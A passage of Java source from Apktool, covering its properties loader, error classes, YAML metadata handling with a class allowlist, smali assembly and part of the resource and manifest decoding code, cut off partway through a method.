import java.io.IOException;
import java.io.InputStream;
import java.util.Properties;
import java.util.logging.Logger;

public class ApktoolProperties {
    public static String get(String key) {
        return get().getProperty(key);
    }

    public static Properties get() {
        if (sProps == null) {
            loadProps();
        }
        return sProps;
    }

    private static void loadProps() {
        InputStream in = ApktoolProperties.class.getResourceAsStream("/properties/apktool.properties");
        sProps = new Properties();
        try {
            sProps.load(in);
            in.close();
        } catch (IOException ex) {
            LOGGER.warning("Can't load properties.");
        }

        InputStream templateStream = null;
        try {
            templateStream = org.jf.baksmali.Main.class.getClassLoader().getResourceAsStream("baksmali.properties");
        } catch(NoClassDefFoundError ex) {
            LOGGER.warning("Can't load baksmali properties.");
        }
        Properties properties = new Properties();
        String version = "(unknown)";

        if (templateStream != null) {
            try {
                properties.load(templateStream);
                version = properties.getProperty("application.version");
                templateStream.close();
            } catch (IOException ignored) { }
        }
        sProps.put("baksmaliVersion", version);

        templateStream = null;
        try {
            templateStream = org.jf.smali.Main.class.getClassLoader().getResourceAsStream("smali.properties");
        } catch(NoClassDefFoundError ex) {
            LOGGER.warning("Can't load smali properties.");
        }
        properties = new Properties();
        version = "(unknown)";

        if (templateStream != null) {
            try {
                properties.load(templateStream);
                version = properties.getProperty("application.version");
                templateStream.close();
            } catch (IOException ignored) { }
        }
        sProps.put("smaliVersion", version);
    }

    private static Properties sProps;

    private static final Logger LOGGER = Logger.getLogger(ApktoolProperties.class.getName());
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/err/AXmlDecodingException.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.err;

import brut.androlib.AndrolibException;

public class AXmlDecodingException extends AndrolibException {
    public AXmlDecodingException(String message, Throwable cause) {
        super(message, cause);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/err/CantFind9PatchChunkException.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.err;

import brut.androlib.AndrolibException;

public class CantFind9PatchChunkException extends AndrolibException {
	public CantFind9PatchChunkException(String message, Throwable cause) {
		super(message, cause);
	}
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/err/CantFindFrameworkResException.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.err;

import brut.androlib.AndrolibException;

public class CantFindFrameworkResException extends AndrolibException {
	public CantFindFrameworkResException(int id) {
		mPkgId = id;
	}

	public int getPkgId() {
		return mPkgId;
	}

	@Override
	public String getMessage() {
		return String.format("Can't find framework resources for package of id: %d", this.getPkgId());
	}

	private final int mPkgId;
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/err/InFileNotFoundException.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.err;

import brut.androlib.AndrolibException;

public class InFileNotFoundException extends AndrolibException {
	public InFileNotFoundException() {
	}
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/err/OutDirExistsException.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.err;

import brut.androlib.AndrolibException;

public class OutDirExistsException extends AndrolibException {
	public OutDirExistsException() {
	}
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/err/RawXmlEncounteredException.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.err;

import brut.androlib.AndrolibException;

public class RawXmlEncounteredException extends AndrolibException {
    public RawXmlEncounteredException(String message, Throwable cause) {
        super(message, cause);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/err/UndefinedResObjectException.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.err;

import brut.androlib.AndrolibException;

public class UndefinedResObjectException extends AndrolibException {
	public UndefinedResObjectException(String message) {
		super(message);
	}
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/meta/ClassSafeConstructor.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.meta;

import org.yaml.snakeyaml.constructor.AbstractConstruct;
import org.yaml.snakeyaml.constructor.Constructor;
import org.yaml.snakeyaml.error.YAMLException;
import org.yaml.snakeyaml.nodes.Node;
import org.yaml.snakeyaml.nodes.ScalarNode;
import org.yaml.snakeyaml.nodes.Tag;
import java.util.ArrayList;
import java.util.List;

public class ClassSafeConstructor extends Constructor {
    protected final List<Class<?>> allowableClasses = new ArrayList<>();

    public ClassSafeConstructor() {
        this.yamlConstructors.put(Tag.STR, new ConstructStringEx());

        this.allowableClasses.add(MetaInfo.class);
        this.allowableClasses.add(PackageInfo.class);
        this.allowableClasses.add(UsesFramework.class);
        this.allowableClasses.add(VersionInfo.class);
    }

    protected Object newInstance(Node node) {
        if (this.yamlConstructors.containsKey(node.getTag()) || this.allowableClasses.contains(node.getType())) {
            return super.newInstance(node);
        }
        throw new YAMLException("Invalid Class attempting to be constructed: " + node.getTag());
    }

    protected Object finalizeConstruction(Node node, Object data) {
        if (this.yamlConstructors.containsKey(node.getTag()) || this.allowableClasses.contains(node.getType())) {
            return super.finalizeConstruction(node, data);
        }

        return this.newInstance(node);
    }

    private class ConstructStringEx extends AbstractConstruct {
        public Object construct(Node node) {
            String val = constructScalar((ScalarNode) node);
            return YamlStringEscapeUtils.unescapeString(val);
        }
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/meta/EscapedStringRepresenter.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.meta;

import org.yaml.snakeyaml.nodes.Node;
import org.yaml.snakeyaml.representer.Representer;

public class EscapedStringRepresenter extends Representer {
    public EscapedStringRepresenter() {
        RepresentStringEx representStringEx = new RepresentStringEx();
        multiRepresenters.put(String.class, representStringEx);
        representers.put(String.class, representStringEx);
    }

    private class RepresentStringEx extends RepresentString {

        @Override
        public Node representData(Object data) {
            return super.representData(YamlStringEscapeUtils.escapeString(data.toString()));
        }
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/meta/MetaInfo.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.meta;

import org.yaml.snakeyaml.DumperOptions;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.introspector.PropertyUtils;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.Collection;
import java.util.Map;

public class MetaInfo {
    public String version;
    public String apkFileName;
    public boolean isFrameworkApk;
    public UsesFramework usesFramework;
    public  Map<String, String> sdkInfo;
    public PackageInfo packageInfo;
    public VersionInfo versionInfo;
    public boolean compressionType;
    public boolean sharedLibrary;
    public boolean sparseResources;
    public Map<String, String> unknownFiles;
    public Collection<String> doNotCompress;

    private static Yaml getYaml() {
        DumperOptions options = new DumperOptions();
        options.setDefaultFlowStyle(DumperOptions.FlowStyle.BLOCK);

        EscapedStringRepresenter representer = new EscapedStringRepresenter();
        PropertyUtils propertyUtils = representer.getPropertyUtils();
        propertyUtils.setSkipMissingProperties(true);

        return new Yaml(new ClassSafeConstructor(), representer, options);
    }

    public void save(Writer output) {
        DumperOptions options = new DumperOptions();
        options.setDefaultFlowStyle(DumperOptions.FlowStyle.BLOCK);
        getYaml().dump(this, output);
    }

    public void save(File file) throws IOException {
        try(
                FileOutputStream fos = new FileOutputStream(file);
                OutputStreamWriter outputStreamWriter = new OutputStreamWriter(fos, StandardCharsets.UTF_8);
                Writer writer = new BufferedWriter(outputStreamWriter)
        ) {
            save(writer);
        }
    }

    public static MetaInfo load(InputStream is) {
        return getYaml().loadAs(is, MetaInfo.class);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/meta/PackageInfo.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.meta;

public class PackageInfo {
    public String forcedPackageId;
    public String renameManifestPackage;
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/meta/UsesFramework.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.meta;

import java.util.List;

public class UsesFramework {
    public List<Integer> ids;
    public String tag;
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/meta/VersionInfo.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.meta;

public class VersionInfo {
    public String versionCode;
    public String versionName;
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/meta/YamlStringEscapeUtils.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.meta;

import org.apache.commons.text.StringEscapeUtils;
import org.apache.commons.text.translate.CharSequenceTranslator;

import java.io.IOException;
import java.io.StringWriter;
import java.io.Writer;

public class YamlStringEscapeUtils {

    public static String escapeString(String str) {
        return escapeJavaStyleString(str, false, false);
    }

    /**
     * @param str String to escape values in, may be null
     * @param escapeSingleQuotes escapes single quotes if <code>true</code>
     * @param escapeForwardSlash TODO
     * @return the escaped string
     */
    private static String escapeJavaStyleString(String str, boolean escapeSingleQuotes, boolean escapeForwardSlash) {
        if (str == null) {
            return null;
        }
        try {
            StringWriter writer = new StringWriter(str.length() * 2);
            escapeJavaStyleString(writer, str, escapeSingleQuotes, escapeForwardSlash);
            return writer.toString();
        } catch (IOException ioe) {
            // this should never ever happen while writing to a StringWriter
            throw new RuntimeException(ioe);
        }
    }

    /**
     * @param out write to receieve the escaped string
     * @param str String to escape values in, may be null
     * @param escapeSingleQuote escapes single quotes if <code>true</code>
     * @param escapeForwardSlash TODO
     * @throws IOException if an IOException occurs
     */
    private static void escapeJavaStyleString(Writer out, String str, boolean escapeSingleQuote,
                                              boolean escapeForwardSlash) throws IOException {
        if (out == null) {
            throw new IllegalArgumentException("The Writer must not be null");
        }
        if (str == null) {
            return;
        }
        int sz;
        sz = str.length();
        for (int i = 0; i < sz; i++) {
            char ch = str.charAt(i);
            // "[^\t\n\r\u0020-\u007E\u0085\u00A0-\uD7FF\uE000-\uFFFD]"
            // handle unicode
            if (ch > 0xFFFD) {
                out.write("\\u" + CharSequenceTranslator.hex(ch));
            } else if (ch > 0xD7FF && ch < 0xE000) {
                out.write("\\u" + CharSequenceTranslator.hex(ch));
            } else if (ch > 0x7E && ch != 0x85 && ch < 0xA0) {
                out.write("\\u00" + CharSequenceTranslator.hex(ch));
            } else if (ch < 32) {
                switch (ch) {
                    case '\t' :
                        out.write('\\');
                        out.write('t');
                        break;
                    case '\n' :
                        out.write('\\');
                        out.write('n');
                        break;
                    case '\r' :
                        out.write('\\');
                        out.write('r');
                        break;
                    default :
                        if (ch > 0xf) {
                            out.write("\\u00" + CharSequenceTranslator.hex(ch));
                        } else {
                            out.write("\\u000" + CharSequenceTranslator.hex(ch));
                        }
                        break;
                }
            } else {
                switch (ch) {
                    case '\'' :
                        if (escapeSingleQuote) {
                            out.write('\\');
                        }
                        out.write('\'');
                        break;
                    case '"' :
                        out.write('\\');
                        out.write('"');
                        break;
                    case '\\' :
                        out.write('\\');
                        out.write('\\');
                        break;
                    case '/' :
                        if (escapeForwardSlash) {
                            out.write('\\');
                        }
                        out.write('/');
                        break;
                    default :
                        out.write(ch);
                        break;
                }
            }
        }
    }

    /**
     * <p>Unescapes any Java literals found in the <code>String</code>.
     * For example, it will turn a sequence of <code>'\'</code> and
     * <code>'n'</code> into a newline character, unless the <code>'\'</code>
     * is preceded by another <code>'\'</code>.</p>
     *
     * @param str  the <code>String</code> to unescape, may be null
     * @return a new unescaped <code>String</code>, <code>null</code> if null string input
     */
    public static String unescapeString(String str) {
        return StringEscapeUtils.unescapeJava(str);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/mod/SmaliMod.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.mod;

import org.antlr.runtime.CommonTokenStream;
import org.antlr.runtime.RecognitionException;
import org.antlr.runtime.Token;
import org.antlr.runtime.tree.CommonTree;
import org.antlr.runtime.tree.CommonTreeNodeStream;
import org.jf.dexlib2.writer.builder.DexBuilder;
import org.jf.smali.smaliFlexLexer;
import org.jf.smali.smaliParser;
import org.jf.smali.smaliTreeWalker;

import java.io.*;
import java.nio.charset.StandardCharsets;

public class SmaliMod {
    public static boolean assembleSmaliFile(File smaliFile,DexBuilder dexBuilder, int apiLevel, boolean verboseErrors,
                                            boolean printTokens) throws IOException, RecognitionException {

        CommonTokenStream tokens;
        smaliFlexLexer lexer;

        InputStream is = new FileInputStream(smaliFile);
        InputStreamReader reader = new InputStreamReader(is, StandardCharsets.UTF_8);

        lexer = new smaliFlexLexer(reader, apiLevel);
        (lexer).setSourceFile(smaliFile);
        tokens = new CommonTokenStream(lexer);

        if (printTokens) {
            tokens.getTokens();

            for (int i=0; i<tokens.size(); i++) {
                Token token = tokens.get(i);
                if (token.getChannel() == smaliParser.HIDDEN) {
                    continue;
                }

                System.out.println(smaliParser.tokenNames[token.getType()] + ": " + token.getText());
            }
        }

        smaliParser parser = new smaliParser(tokens);
        parser.setApiLevel(apiLevel);
        parser.setVerboseErrors(verboseErrors);

        smaliParser.smali_file_return result = parser.smali_file();

        if (parser.getNumberOfSyntaxErrors() > 0 || lexer.getNumberOfSyntaxErrors() > 0) {
            is.close();
            reader.close();
            return false;
        }

        CommonTree t = result.getTree();

        CommonTreeNodeStream treeStream = new CommonTreeNodeStream(t);
        treeStream.setTokenStream(tokens);

        smaliTreeWalker dexGen = new smaliTreeWalker(treeStream);
        dexGen.setApiLevel(apiLevel);
        dexGen.setVerboseErrors(verboseErrors);
        dexGen.setDexBuilder(dexBuilder);
        dexGen.smali_file();

        is.close();
        reader.close();

        return dexGen.getNumberOfSyntaxErrors() == 0;
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/options/BuildOptions.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.options;

import java.util.Collection;

public class BuildOptions {
    public boolean forceBuildAll = false;
    public boolean forceDeleteFramework = false;
    public boolean debugMode = false;
    public boolean netSecConf = false;
    public boolean verbose = false;
    public boolean copyOriginalFiles = false;
    public final boolean updateFiles = false;
    public boolean isFramework = false;
    public boolean resourcesAreCompressed = false;
    public boolean useAapt2 = false;
    public boolean noCrunch = false;
    public int forceApi = 0;
    public Collection<String> doNotCompress;

    public String frameworkFolderLocation = null;
    public String frameworkTag = null;
    public String aaptPath = "";

    public int aaptVersion = 1; // default to v1

    public boolean isAapt2() {
        return this.useAapt2 || this.aaptVersion == 2;
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/AndrolibResources.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res;

import brut.androlib.AndrolibException;
import brut.androlib.options.BuildOptions;
import brut.androlib.err.CantFindFrameworkResException;
import brut.androlib.meta.MetaInfo;
import brut.androlib.meta.PackageInfo;
import brut.androlib.meta.VersionInfo;
import brut.androlib.res.data.*;
import brut.androlib.res.decoder.*;
import brut.androlib.res.decoder.ARSCDecoder.ARSCData;
import brut.androlib.res.decoder.ARSCDecoder.FlagsOffset;
import brut.androlib.res.util.ExtMXSerializer;
import brut.androlib.res.util.ExtXmlSerializer;
import brut.androlib.res.xml.ResValuesXmlSerializable;
import brut.androlib.res.xml.ResXmlPatcher;
import brut.common.BrutException;
import brut.directory.*;
import brut.util.*;
import org.apache.commons.io.IOUtils;
import org.xmlpull.v1.XmlSerializer;

import java.io.*;
import java.util.*;
import java.util.logging.Logger;
import java.util.zip.CRC32;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

final public class AndrolibResources {
    public ResTable getResTable(ExtFile apkFile) throws AndrolibException {
        return getResTable(apkFile, true);
    }

    public ResTable getResTable(ExtFile apkFile, boolean loadMainPkg)
            throws AndrolibException {
        ResTable resTable = new ResTable(this);
        if (loadMainPkg) {
            loadMainPkg(resTable, apkFile);
        }
        return resTable;
    }

    public ResPackage loadMainPkg(ResTable resTable, ExtFile apkFile)
            throws AndrolibException {
        LOGGER.info("Loading resource table...");
        ResPackage[] pkgs = getResPackagesFromApk(apkFile, resTable, sKeepBroken);
        ResPackage pkg;

        switch (pkgs.length) {
            case 0:
                pkg = null;
                break;
            case 1:
                pkg = pkgs[0];
                break;
            case 2:
                LOGGER.warning("Skipping package group: " + pkgs[0].getName());
                pkg = pkgs[1];
                break;
            default:
                pkg = selectPkgWithMostResSpecs(pkgs);
                break;
        }

        if (pkg == null) {
            throw new AndrolibException("arsc files with zero packages or no arsc file found.");
        }

        resTable.addPackage(pkg, true);
        return pkg;
    }

    public ResPackage selectPkgWithMostResSpecs(ResPackage[] pkgs) {
        int id = 0;
        int value = 0;
        int index = 0;

        for (int i = 0; i < pkgs.length; i++) {
            ResPackage resPackage = pkgs[i];
            if (resPackage.getResSpecCount() > value && ! resPackage.getName().equalsIgnoreCase("android")) {
                value = resPackage.getResSpecCount();
                id = resPackage.getId();
                index = i;
            }
        }

        // if id is still 0, we only have one pkgId which is "android" -> 1
        return (id == 0) ? pkgs[0] : pkgs[index];
    }

    public ResPackage loadFrameworkPkg(ResTable resTable, int id, String frameTag)
            throws AndrolibException {
        File apk = getFrameworkApk(id, frameTag);

        LOGGER.info("Loading resource table from file: " + apk);
        mFramework = new ExtFile(apk);
        ResPackage[] pkgs = getResPackagesFromApk(mFramework, resTable, true);

        ResPackage pkg;
        if (pkgs.length > 1) {
            pkg = selectPkgWithMostResSpecs(pkgs);
        } else if (pkgs.length == 0) {
            throw new AndrolibException("Arsc files with zero or multiple packages");
        } else {
            pkg = pkgs[0];
        }

        if (pkg.getId() != id) {
            throw new AndrolibException("Expected pkg of id: " + id + ", got: " + pkg.getId());
        }

        resTable.addPackage(pkg, false);
        return pkg;
    }

    public void decodeManifest(ResTable resTable, ExtFile apkFile, File outDir)
            throws AndrolibException {

        Duo<ResFileDecoder, AXmlResourceParser> duo = getManifestFileDecoder(false);
        ResFileDecoder fileDecoder = duo.m1;

        // Set ResAttrDecoder
        duo.m2.setAttrDecoder(new ResAttrDecoder());
        ResAttrDecoder attrDecoder = duo.m2.getAttrDecoder();

        // Fake ResPackage
        attrDecoder.setCurrentPackage(new ResPackage(resTable, 0, null));

        Directory inApk, out;
        try {
            inApk = apkFile.getDirectory();
            out = new FileDirectory(outDir);

            LOGGER.info("Decoding AndroidManifest.xml with only framework resources...");
            fileDecoder.decodeManifest(inApk, "AndroidManifest.xml", out, "AndroidManifest.xml");

        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    public void adjustPackageManifest(ResTable resTable, String filePath)
            throws AndrolibException {

        // compare resources.arsc package name to the one present in AndroidManifest
        ResPackage resPackage = resTable.getCurrentResPackage();
        String pkgOriginal = resPackage.getName();
        mPackageRenamed = resTable.getPackageRenamed();

        resTable.setPackageId(resPackage.getId());
        resTable.setPackageOriginal(pkgOriginal);

        // 1) Check if pkgOriginal === mPackageRenamed
        // 2) Check if pkgOriginal is ignored via IGNORED_PACKAGES
        if (pkgOriginal.equalsIgnoreCase(mPackageRenamed) || (Arrays.asList(IGNORED_PACKAGES).contains(pkgOriginal))) {
            LOGGER.info("Regular manifest package...");
        } else {
            LOGGER.info("Renamed manifest package found! Replacing " + mPackageRenamed + " with " + pkgOriginal);
            ResXmlPatcher.renameManifestPackage(new File(filePath), pkgOriginal);
        }
    }

    public void decodeManifestWithResources(ResTable resTable, ExtFile apkFile, File outDir)
            throws AndrolibException {

        Duo<ResFileDecoder, AXmlResourceParser> duo = getManifestFileDecoder(true);
        ResFileDecoder fileDecoder = duo.m1;
        ResAttrDecoder attrDecoder = duo.m2.getAttrDecoder();

        attrDecoder.setCurrentPackage(resTable.listMainPackages().iterator().next());

        Directory inApk, in = null, out;
        try {
            inApk = apkFile.getDirectory();
            out = new FileDirectory(outDir);
            LOGGER.info("Decoding AndroidManifest.xml with resources...");

            fileDecoder.decodeManifest(inApk, "AndroidManifest.xml", out, "AndroidManifest.xml");

            // Remove versionName / versionCode (aapt API 16)
            if (!resTable.getAnalysisMode()) {

                // check for a mismatch between resources.arsc package and the package listed in AndroidManifest
                // also remove the android::versionCode / versionName from manifest for rebuild
                // this is a required change to prevent aapt warning about conflicting versions
                // it will be passed as a parameter to aapt like "--min-sdk-version" via apktool.yml
                adjustPackageManifest(resTable, outDir.getAbsolutePath() + File.separator + "AndroidManifest.xml");

                ResXmlPatcher.removeManifestVersions(new File(
                        outDir.getAbsolutePath() + File.separator + "AndroidManifest.xml"));

                mPackageId = String.valueOf(resTable.getPackageId());
            }
        } catch (DirectoryException ex) {
